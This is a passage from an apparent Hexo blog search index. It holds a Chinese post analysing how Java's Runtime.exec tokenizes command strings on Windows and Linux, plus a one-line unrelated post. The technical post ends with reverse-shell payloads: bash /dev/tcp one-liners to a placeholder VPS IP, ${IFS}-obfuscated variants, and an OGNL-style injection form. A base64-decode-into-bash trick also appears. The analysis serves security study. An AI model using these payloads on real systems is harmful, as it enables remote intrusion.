src="/2023/03/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1710320177595-81bff08b-baa0-4c37-b10c-de698e328b9e.png"></p><p>下断点跟进，先进入java.lang.Runtime#exec(String command)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> exec(command, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进，进入java.lang.Runtime#exec(String command, String[] envp, File dir)。这里先会判断传入的command是否为空，当不为空时会传入StringTokenizer类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command, String[] envp, File dir)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (command.length() == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Empty command&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringTokenizer</span> <span class="variable">st</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(command);</span><br><span class="line">    String[] cmdarray = <span class="keyword">new</span> <span class="title class_">String</span>[st.countTokens()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; st.hasMoreTokens(); i++)</span><br><span class="line">        cmdarray[i] = st.nextToken();</span><br><span class="line">    <span class="keyword">return</span> exec(cmdarray, envp, dir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进StringTokenizer类，这里会将传入的字符串按照\t\n\r\f和空格进行分割。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">StringTokenizer</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(str, <span class="string">&quot; \t\n\r\f&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到再进一步调用java.lang.Runtime#exec(String[] cmdarray, String[] envp, File dir)前，传入的待执行命令字符串变成了[“echo”, “”h3rmesk1t””, “&gt;”, “C:\Users\95235\Downloads\1.txt”]。</p><p><img src="/2023/03/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1710320178163-eb038859-c94b-4696-af8c-f1332fa8d1bf.png"></p><p>之后再传入ProcessBuilder，最后来到ProcessImpl，Runtime和ProcessBuilder的底层实际上都是ProcessImpl。而不能执行echo命令的原因是因为Java找不到这个东西，没有环境变量，因此加上cmd &#x2F;c即可。</p><p><img src="/2023/03/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1710320178493-e3fa4107-134d-45bf-b7b2-31ad65659de0.png"></p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>在Linux环境中也存在着类似的问题，例如&#x2F;bin&#x2F;sh -c echo 1 &gt; 1.txt虽然会创建文件，但是文件并没有内容，这是因为&#x2F;bin&#x2F;sh -c需要一个字符串作为参数来执行。而当后续为字符串时，根据上面分析的，经过StringTokenizer类后，整个命令变成了{“&#x2F;bin&#x2F;sh”,”-c”,””echo”,”1”,”&gt;”,”1.txt””}。</p><p>因此，在Linux环境下，可以采用数组或者Base64编码的形式来执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 1 &gt; 1.txt&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">/bin/bash -c &#123;echo,base64-encode-string&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>补充，在Linux环境下弹shell的一些姿势。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">5000</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="comment">//适用于直接执行这个命令不能弹的情况</span></span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/你的vps ip/监听端口&lt;&amp;1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/你的vps ip/监听端口&lt;&amp;1&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日寇投降纪念日</title>
      <link href="/1945/08/15/hello-world/"/>
      <url>/1945/08/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/1945/08/15/hello-world/sb.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
